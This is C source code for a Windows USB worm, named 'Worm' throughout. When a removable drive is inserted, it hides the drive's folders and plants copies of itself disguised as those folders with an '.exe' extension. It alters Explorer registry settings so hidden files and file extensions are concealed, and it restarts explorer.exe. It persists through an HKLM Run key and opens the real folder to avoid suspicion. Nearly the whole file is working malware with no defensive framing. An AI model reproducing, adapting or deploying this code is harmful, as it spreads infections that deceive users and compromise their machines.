#include <stdio.h>
#include <stdbool.h>
#include <tchar.h>
#include <Windows.h>
#include <Dbt.h>
#include <Psapi.h>

inline int GetDriveID(int mask)
{
	int i=0;
	for(;i<32;i++)
		if((mask>>i)&1)
			return i;
	return -1;
}

inline bool IsRemovableDrive(TCHAR* drive)
{
	if(GetDriveType(drive)==DRIVE_REMOVABLE)
		return true;
	return false;
}

bool ExplorerRegistry()
{
	HKEY hKey;
	TCHAR* path=_T("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
	int value=RegOpenKeyEx(HKEY_CURRENT_USER,path,0,KEY_WRITE,&hKey);
	if(value!=ERROR_SUCCESS)
		return false;
	value=2;
	value=RegSetValueEx(hKey,_T("Hidden"),0,REG_DWORD,(char*)&value,sizeof(int));//隐藏文件
	if(value!=ERROR_SUCCESS)
		return false;
	value=1;
	value=RegSetValueEx(hKey,_T("HideFileExt"),0,REG_DWORD,(char*)&value,sizeof(int));//隐藏已知文件扩展名
	if(value!=ERROR_SUCCESS)
		return false;
	value=0;
	value=RegSetValueEx(hKey,_T("ShowSuperHidden"),0,REG_DWORD,(char*)&value,sizeof(int));//隐藏系统文件
	if(value!=ERROR_SUCCESS)
		return false;
	return true;
}

bool HideAndCopy(TCHAR* path,TCHAR* source)
{
	TCHAR temp[MAX_PATH];
	_tcscpy(temp,path);
	_tcscat(temp,_T("*"));
	WIN32_FIND_DATA FindData;
	HANDLE hFile=FindFirstFile(temp,&FindData);
	if(hFile==INVALID_HANDLE_VALUE)
		return false;
	if(!ExplorerRegistry())
		return false;
	do
	{
		if(_tcscmp(FindData.cFileName,_T("."))==0||_tcscmp(FindData.cFileName,_T(".."))==0)
			continue;
		if(FindData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY&&
			!(FindData.dwFileAttributes&FILE_ATTRIBUTE_HIDDEN)&&
			!(FindData.dwFileAttributes&FILE_ATTRIBUTE_SYSTEM))
		{
			_tcscpy(temp,path);
			_tcscat(temp,FindData.cFileName);
			SetFileAttributes(temp,FindData.dwFileAttributes|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
			_tcscpy(temp,path);
			_tcscat(temp,FindData.cFileName);
			_tcscat(temp,_T(".exe"));
			CopyFile(source,temp,1);
		}
	} while(FindNextFile(hFile,&FindData));
	FindClose(hFile);
	return true;
}

bool IsInfected(TCHAR* drive,TCHAR* source)
{
	WIN32_FIND_DATA FindData;
	TCHAR path[MAX_PATH];
	_tcscpy(path,drive);
	_tcscat(path,_T("*.exe"));
	HANDLE hFile=FindFirstFile(path,&FindData);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		if(GetLastError()==ERROR_FILE_NOT_FOUND)
			return false;
		else
			return true;
	}
	HANDLE hSource=CreateFile(source,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	int size=GetFileSize(hSource,0);
	CloseHandle(hSource);
	bool infected=false;
	do
	{
		if(_tcscmp(FindData.cFileName,_T("."))==0||_tcscmp(FindData.cFileName,_T(".."))==0)
			continue;
		_tcscpy(path,drive);
		_tcscat(path,FindData.cFileName);
		hSource=CreateFile(source,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
		if(hSource!=INVALID_HANDLE_VALUE)
		{
			if(GetFileSize(hSource,0)==size)
				infected=true;
			CloseHandle(hSource);
		}
	} while(!infected&&FindNextFile(hFile,&FindData));
	FindClose(hFile);
	return infected;
}

bool RestartExplorer()
{
	int PID[512],count;
	EnumProcesses(PID,512*sizeof(int),&count);
	for(int i=0;i<count/sizeof(int);i++)
	{
		HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,0,PID[i]);
		if(hProcess)
		{
			TCHAR BaseName[MAX_PATH];
			GetModuleBaseName(hProcess,0,BaseName,MAX_PATH);
			if(_tcsicmp(BaseName,_T("explorer.exe"))==0)
			{
				TerminateProcess(hProcess,0);//结束explorer后自动重新启动
				WaitForSingleObject(hProcess,INFINITE);
				CloseHandle(hProcess);
				return true;
			}
			CloseHandle(hProcess);
		}
	}
	return false;
}

LRESULT __stdcall WndProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	switch(message)
	{
	case WM_DEVICECHANGE:
		if(wParam==DBT_DEVICEARRIVAL&&((DEV_BROADCAST_HDR*)lParam)->dbch_devicetype==DBT_DEVTYP_VOLUME)
		{
			TCHAR drive[]=_T("A:\\");
			drive[0]+=GetDriveID(((DEV_BROADCAST_VOLUME*)lParam)->dbcv_unitmask);
			TCHAR FileName[MAX_PATH];
			GetModuleFileName(0,FileName,MAX_PATH);
			if(IsRemovableDrive(drive)&&!IsInfected(drive,FileName))
			{
				if(HideAndCopy(drive,FileName))
				{
					RestartExplorer();
				}
			}
		}
		return 0;

	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hwnd,message,wParam,lParam);
}

void OpenDirectory()
{
	TCHAR path[MAX_PATH]={_T("C:\\Windows\\explorer.exe /e,/root,")},temp[MAX_PATH];
	GetModuleFileName(0,temp,MAX_PATH);
	*_tcsrchr(temp,'.')=0;
	WIN32_FIND_DATA FindData;
	FindFirstFile(temp,&FindData);
	if(GetLastError()==ERROR_FILE_NOT_FOUND)
		return;
	_tcscat(path,temp);
	STARTUPINFO StartupInfo={sizeof(STARTUPINFO)};
	PROCESS_INFORMATION ProcessInformation;
	if(CreateProcess(0,path,0,0,0,0,0,0,&StartupInfo,&ProcessInformation))
	{
		CloseHandle(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hProcess);
	}
}

bool Restore()
{
	TCHAR FileName[MAX_PATH];
	GetModuleFileName(0,FileName,MAX_PATH);
	*(_tcsrchr(FileName,'\\')+1)=0;
	_tcscat(FileName,_T("*.exe"));
	WIN32_FIND_DATA FindData;
	HANDLE hFile=FindFirstFile(FileName,&FindData);
	if(hFile==INVALID_HANDLE_VALUE)
		return false;
	do
	{
		if(_tcscmp(FindData.cFileName,_T("."))==0||_tcscmp(FindData.cFileName,_T(".."))==0)
			continue;
		_tcscpy(_tcsrchr(FileName,'\\')+1,FindData.cFileName);
		*_tcsrchr(FileName,'.')=0;
		WIN32_FIND_DATA TempData;
		FindFirstFile(FileName,&TempData);
		if(GetLastError()==ERROR_FILE_NOT_FOUND)
			continue;
		SetFileAttributes(FileName,GetFileAttributes(FileName)&~FILE_ATTRIBUTE_HIDDEN&~FILE_ATTRIBUTE_SYSTEM);
		FileName[_tcslen(FileName)]='.';
		DeleteFile(FileName);
	} while(FindNextFile(hFile,&FindData));
	FindClose(hFile);
	HKEY hKey;
	TCHAR path[MAX_PATH]=_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,path,0,KEY_READ|KEY_WRITE,&hKey);
	RegDeleteValue(hKey,_T("Worm"));
	return true;
}

void PowerBoot()
{
	HKEY hKey;
	TCHAR path[MAX_PATH]=_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,path,0,KEY_READ|KEY_WRITE,&hKey);
	int count=MAX_PATH*sizeof(TCHAR);
	count=RegGetValue(hKey,0,_T("Worm"),REG_SZ,0,path,&count);
	if(count==ERROR_SUCCESS)
		return;
	path[0]='"';
	GetModuleFileName(0,path+1,MAX_PATH-1);
	count=(int)_tcslen(path);
	path[count]='"';
	path[count+1]=0;
	RegSetValueEx(hKey,_T("Worm"),0,REG_SZ,(char*)path,MAX_PATH*sizeof(TCHAR));
}

int __stdcall _tWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR lpCmdLine,int nCmdShow)
{
	if(_tcscmp(lpCmdLine,_T("restore"))==0)
	{
		Restore();
		return 0;
	}
	OpenDirectory();
	HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,0,_T("Worm"));
	if(!hEvent)
	{
		PowerBoot();
		hEvent=CreateEvent(0,1,0,_T("Worm"));
	}
	else
		return 0;

	WNDCLASSEX WndclassEx;
	WndclassEx.cbSize=sizeof(WNDCLASSEX);
	WndclassEx.hbrBackground=GetStockObject(WHITE_BRUSH);
	WndclassEx.hCursor=LoadImage(0,IDC_ARROW,IMAGE_CURSOR,0,0,LR_SHARED);
	WndclassEx.hIcon=LoadImage(0,IDI_APPLICATION,IMAGE_ICON,0,0,LR_SHARED);
	WndclassEx.hInstance=hInstance;
	WndclassEx.lpfnWndProc=WndProc;
	WndclassEx.lpszClassName=_T("Worm");
	WndclassEx.lpszMenuName=0;
	WndclassEx.style=CS_HREDRAW|CS_VREDRAW;
	WndclassEx.cbWndExtra=0;
	WndclassEx.cbClsExtra=0;
	WndclassEx.hIconSm=WndclassEx.hIcon;
	RegisterClassEx(&WndclassEx);
	HWND hwnd=CreateWindowEx(0,_T("Worm"),_T(""),WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,0,0,hInstance,0);
	//ShowWindow(hwnd,nCmdShow);
	MSG msg;
	while(GetMessage(&msg,0,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.message;
}